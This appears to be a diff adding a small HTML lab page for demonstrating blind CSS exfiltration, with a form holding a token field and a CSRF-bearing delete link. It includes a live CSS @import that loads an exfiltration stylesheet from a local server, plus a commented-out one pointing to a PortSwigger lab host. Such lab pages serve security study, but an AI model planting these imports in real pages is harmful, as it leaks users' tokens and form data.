@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Portswigger: Exfiltration Example</title>
+  <style>
+/*
+    @import 'http://127.0.0.1:5001/start';
+    @import 'https://portswigger-labs.net/blind-css-exfiltration/start';
+       it displays the results in the console on the server as well as showing the results in the browser using pure CSS
+    */
+  </style>
+</head>
+<body>
+<div>
+<form action="/post?id=86" method="post">
+    <div>
+        <input type="text" name="mytoken" value="ddaf35a193617abacc417349ae204">
+    </div>
+    <div>
+        <input type="text" name="first_name" value="et">
+    </div>
+    <div>
+        <input type="text" name="last_name" value="cetera">
+    </div>
+    <div>
+        <input type="text" name="email" value="security@returntosend.er">
+    </div>
+    <div>
+        <textarea name=comment>datasets</textarea>
+    </div>
+    <a href="/delete?csrf-token=6f139a39306a8ae8a97">Delete account</a>
+    </form>
+</div>
+<style>
+@import 'http://localhost:5001/start';
+</style>
+</body>
+</html>
+
